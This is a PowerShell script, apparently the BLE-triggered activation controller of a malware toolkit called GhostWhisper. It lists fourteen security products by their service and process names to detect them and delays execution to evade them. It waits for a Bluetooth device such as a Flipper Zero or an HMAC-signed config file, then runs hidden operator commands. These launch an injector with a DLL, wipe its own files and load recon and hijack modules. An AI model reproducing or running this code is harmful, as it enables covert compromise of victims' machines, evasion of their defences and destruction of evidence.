# BLETrigger.ps1 v1.6.0
# GhostWhisper BLE Activation Controller with Advanced EDR Evasion
# Supports: Flipper Zero, custom BLE beacons, OBEX, proximity triggers

param(
    [switch]$Monitor,
    [switch]$Silent,
    [int]$TimeoutMinutes = 10,
    [string]$DeviceID = "GhostWhisperer"
)

$script:Version = "1.6.0"
$script:KnownDevices = @("GhostWhisperer", "Flipper", "Ghost_Beacon", "RavenLink", "GhostOperator")
$script:AuthToken = "U2FsdGVkX1+RAVEN-OK=="
$script:CfgPath = "C:\ProgramData\.ghost.cfg"
$script:Key = 'RavenLives'
$script:OperatorKey = 'RvL_0517'

# EDR/AV Product Signatures
$script:EDRSignatures = @{
    CrowdStrike    = @{ Services = @("CSFalcon*", "csagent"); Processes = @("CSFalcon*", "falcon*") }
    SentinelOne    = @{ Services = @("Sentinel*"); Processes = @("SentinelAgent*", "SentinelHelper*") }
    CarbonBlack    = @{ Services = @("CbDefense*", "cb*"); Processes = @("CbDefense*", "cb*", "RepMgr*") }
    MsDefender     = @{ Services = @("WinDefend", "WdNisSvc", "Sense"); Processes = @("MsMpEng", "MsSense*") }
    Sophos         = @{ Services = @("Sophos*", "SAVService"); Processes = @("Sophos*", "savservice") }
    Cylance        = @{ Services = @("Cylance*", "CyProtect"); Processes = @("Cylance*", "CyOptics*") }
    ESET           = @{ Services = @("ekrn", "ESET*"); Processes = @("ekrn", "egui") }
    Kaspersky      = @{ Services = @("AVP*", "klnag*"); Processes = @("avp*", "kavtray*") }
    Symantec       = @{ Services = @("Symantec*", "SepMaster*"); Processes = @("ccSvcHst*", "Rtvscan*") }
    McAfee         = @{ Services = @("McAfee*", "mfe*"); Processes = @("McAfee*", "mfetp*", "mfemms*") }
    Bitdefender    = @{ Services = @("VSSERV*", "bdagent*"); Processes = @("bdagent*", "vsserv*") }
    Palo           = @{ Services = @("CyveraService", "Traps*"); Processes = @("Traps*", "cyserver*") }
    FireEye        = @{ Services = @("xagt*", "FIREEYE*"); Processes = @("xagt*") }
    Tanium         = @{ Services = @("Tanium*"); Processes = @("TaniumClient*") }
}

function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $logFile = "$env:ProgramData\ghost_ops_log.txt"
    $timestamp = Get-Date -Format o
    $entry = "[$timestamp][BLETrigger][$Level] $Message"
    try {
        Add-Content -Path $logFile -Value $entry -ErrorAction SilentlyContinue
    } catch {}
    if (-not $Silent) {
        $color = switch ($Level) {
            "WARN" { "Yellow" }
            "ERROR" { "Red" }
            "SUCCESS" { "Green" }
            default { "Gray" }
        }
        Write-Host $entry -ForegroundColor $color
    }
}

function Get-HMAC {
    param([string]$Data, [string]$Key)
    $kb = [Text.Encoding]::UTF8.GetBytes($Key)
    $db = [Text.Encoding]::UTF8.GetBytes($Data)
    $hmac = New-Object Security.Cryptography.HMACSHA256
    $hmac.Key = $kb
    return ([BitConverter]::ToString($hmac.ComputeHash($db))) -replace '-', ''
}

function Test-EDRActive {
    $detected = @()
    
    foreach ($product in $script:EDRSignatures.Keys) {
        $sig = $script:EDRSignatures[$product]
        $found = $false
        
        foreach ($svcPattern in $sig.Services) {
            $svc = Get-Service -Name $svcPattern -ErrorAction SilentlyContinue | 
                   Where-Object { $_.Status -eq 'Running' }
            if ($svc) { $found = $true; break }
        }
        
        if (-not $found) {
            foreach ($procPattern in $sig.Processes) {
                $proc = Get-Process -Name $procPattern -ErrorAction SilentlyContinue
                if ($proc) { $found = $true; break }
            }
        }
        
        if ($found) {
            $detected += $product
        }
    }
    
    return $detected
}

function Get-EDRRiskLevel {
    param([string[]]$EDRList)
    
    $highRisk = @("CrowdStrike", "SentinelOne", "CarbonBlack", "FireEye", "Palo")
    $mediumRisk = @("MsDefender", "Sophos", "ESET", "Tanium")
    
    $riskScore = 0
    foreach ($edr in $EDRList) {
        if ($highRisk -contains $edr) { $riskScore += 3 }
        elseif ($mediumRisk -contains $edr) { $riskScore += 2 }
        else { $riskScore += 1 }
    }
    
    if ($riskScore -ge 5) { return "HIGH" }
    elseif ($riskScore -ge 2) { return "MEDIUM" }
    else { return "LOW" }
}

function Invoke-EDREvasion {
    param([string]$RiskLevel)
    
    switch ($RiskLevel) {
        "HIGH" {
            Write-Log "High-risk EDR detected. Applying maximum evasion delays." "WARN"
            Start-Sleep -Seconds (Get-Random -Minimum 180 -Maximum 420)
            
            [GC]::Collect()
            [GC]::WaitForPendingFinalizers()
        }
        "MEDIUM" {
            Write-Log "Medium-risk EDR detected. Applying evasion delays." "WARN"
            Start-Sleep -Seconds (Get-Random -Minimum 60 -Maximum 180)
        }
        "LOW" {
            Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30)
        }
    }
}

function Test-BLEProximity {
    param([string[]]$KnownDevices = $script:KnownDevices)
    
    try {
        $bleDevices = Get-PnpDevice -Class Bluetooth -Status OK -ErrorAction SilentlyContinue
        
        foreach ($device in $bleDevices) {
            foreach ($known in $KnownDevices) {
                if ($device.FriendlyName -match $known) {
                    Write-Log "BLE device detected: $($device.FriendlyName)" "SUCCESS"
                    return @{
                        Found = $true
                        DeviceName = $device.FriendlyName
                        DeviceId = $device.InstanceId
                    }
                }
            }
        }
        
        if (Test-Path "$env:ProgramData\.ghost_ble_active") {
            $markerAge = ((Get-Date) - (Get-Item "$env:ProgramData\.ghost_ble_active").LastWriteTime).TotalMinutes
            if ($markerAge -lt 15) {
                Write-Log "BLE proximity marker found (age: $([math]::Round($markerAge, 1)) min)" "SUCCESS"
                return @{ Found = $true; DeviceName = "ProximityMarker"; DeviceId = "file" }
            }
        }
        
    } catch {
        Write-Log "BLE scan error: $($_.Exception.Message)" "ERROR"
    }
    
    return @{ Found = $false; DeviceName = $null; DeviceId = $null }
}

function Validate-ConfigSignature {
    if (-not (Test-Path $script:CfgPath)) { return $null }
    
    try {
        $cfg = Get-Content $script:CfgPath | ConvertFrom-Json
        $cmd = $cfg.command
        $timestamp = $cfg.timestamp
        $sig = $cfg.signature
        
        $dt = [datetime]::Parse($timestamp)
        $age = (Get-Date).ToUniversalTime().Subtract($dt).TotalMinutes
        
        $expectedSig = Get-HMAC -Data "$cmd|$timestamp" -Key $script:OperatorKey
        
        if ($sig -eq $expectedSig) {
            if ($age -lt $TimeoutMinutes) {
                Write-Log "Valid config: cmd=$cmd, age=$([math]::Round($age,1))min" "SUCCESS"
                return @{ Command = $cmd; Valid = $true; Expired = $false; GhostTag = $cfg.ghostTag }
            } else {
                Write-Log "Config signature expired: $([math]::Round($age,1)) min" "WARN"
                return @{ Command = $cmd; Valid = $true; Expired = $true; GhostTag = $cfg.ghostTag }
            }
        } else {
            Write-Log "Invalid signature in config" "ERROR"
            return @{ Command = $null; Valid = $false; Expired = $false }
        }
        
    } catch {
        Write-Log "Config parse error: $($_.Exception.Message)" "ERROR"
        return $null
    }
}

function Invoke-GhostAction {
    param([string]$Command, [string]$GhostTag)
    
    Write-Log "Executing action: $Command (Tag: $GhostTag)"
    
    switch ($Command.ToUpper()) {
        'FIRE' {
            $wraithTap = Join-Path $PSScriptRoot "WraithTap.exe"
            $ghostKey = Join-Path $PSScriptRoot "GhostKey.dll"
            
            if (-not (Test-Path $wraithTap)) {
                $wraithTap = "WraithTap.exe"
            }
            if (-not (Test-Path $ghostKey)) {
                $ghostKey = "GhostKey.dll"
            }
            
            if ((Test-Path $wraithTap) -and (Test-Path $ghostKey)) {
                Start-Process -WindowStyle Hidden -FilePath $wraithTap -ArgumentList $ghostKey
                Write-Log "FIRE executed: WraithTap + GhostKey injected" "SUCCESS"
            } else {
                Write-Log "FIRE failed: binaries not found" "ERROR"
            }
        }
        'WIPE' {
            $filesToRemove = @("WraithTap.exe", "GhostKey.dll", "SilentBloom.ps1", $script:CfgPath)
            foreach ($file in $filesToRemove) {
                if (Test-Path $file) {
                    Remove-Item $file -Force -ErrorAction SilentlyContinue
                }
            }
            Write-Log "WIPE executed: core files removed" "SUCCESS"
        }
        'FAILOVER' {
            Write-Log "Encrypted command expired. Attempting BLE proximity fallback..." "WARN"
            $ble = Test-BLEProximity
            
            if ($ble.Found) {
                $decoded = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($script:AuthToken))
                if ($decoded -match "RAVEN-OK|OK") {
                    Write-Log "BLE failover authorized. Executing FIRE." "SUCCESS"
                    Invoke-GhostAction -Command 'FIRE' -GhostTag $GhostTag
                } else {
                    Write-Log "BLE token validation failed" "ERROR"
                }
            } else {
                Write-Log "No BLE fallback device found. Holding." "WARN"
            }
        }
        'WORMHOLE' {
            Write-Log "Activating wormhole mode..." "WARN"
            $wormholeScript = Join-Path $PSScriptRoot "Modules\Wormhole.ps1"
            if (Test-Path $wormholeScript) {
                . $wormholeScript
                if (Get-Command -Name Start-WormholeListener -ErrorAction SilentlyContinue) {
                    Start-WormholeListener
                }
            }
        }
        'PHANTOM' {
            Write-Log "Activating phantom recon..." "WARN"
            $phantomScript = Join-Path $PSScriptRoot "Modules\Phantom.ps1"
            if (Test-Path $phantomScript) {
                . $phantomScript
                if (Get-Command -Name Start-PhantomRecon -ErrorAction SilentlyContinue) {
                    Start-PhantomRecon -Mode "SilentHijack"
                }
            }
        }
        'EXORCIST' {
            Write-Log "Activating exorcist mode..." "WARN"
            $exorcistScript = Join-Path $PSScriptRoot "Modules\ExorcistMode.ps1"
            if (Test-Path $exorcistScript) {
                & $exorcistScript -Mode "anoint"
                & $exorcistScript -Mode "bind"
                & $exorcistScript -Mode "cleanse"
            }
        }
        default {
            Write-Log "Unknown command: $Command" "WARN"
        }
    }
}

function Start-BLEMonitor {
    Write-Log "Starting BLE monitor mode..." "INFO"
    
    $lastCheck = $null
    $checkInterval = 5
    
    while ($true) {
        $ble = Test-BLEProximity
        
        if ($ble.Found -and $lastCheck -ne $ble.DeviceName) {
            Write-Log "BLE device change: $($ble.DeviceName)" "INFO"
            $lastCheck = $ble.DeviceName
            
            Set-Content -Path "$env:ProgramData\.ghost_ble_active" -Value (Get-Date).ToString()
        }
        
        Start-Sleep -Seconds $checkInterval
    }
}

# === MAIN EXECUTION ===

if (-not $Silent) {
    Write-Host ""
    Write-Host "[BLE] GhostWhisper BLE Trigger v$script:Version" -ForegroundColor Cyan
    Write-Host ""
}

if ($Monitor) {
    Start-BLEMonitor
    exit
}

$edrList = Test-EDRActive
if ($edrList.Count -gt 0) {
    Write-Log "EDR detected: $($edrList -join ', ')" "WARN"
    $riskLevel = Get-EDRRiskLevel -EDRList $edrList
    Write-Log "Risk level: $riskLevel" "WARN"
    Invoke-EDREvasion -RiskLevel $riskLevel
} else {
    Write-Log "No EDR detected" "INFO"
}

$ble = Test-BLEProximity
if ($ble.Found) {
    Write-Log "BLE trigger authorized via: $($ble.DeviceName)" "SUCCESS"
}

while ($true) {
    $config = Validate-ConfigSignature
    
    if ($config -and $config.Valid) {
        if ($config.Expired) {
            Invoke-GhostAction -Command 'FAILOVER' -GhostTag $config.GhostTag
        } else {
            Invoke-GhostAction -Command $config.Command -GhostTag $config.GhostTag
        }
        break
    }
    
    if ($ble.Found) {
        Write-Log "BLE proximity confirmed but no config. Waiting..." "INFO"
    }
    
    Start-Sleep -Seconds 5
}

Write-Log "BLETrigger session ended" "INFO"
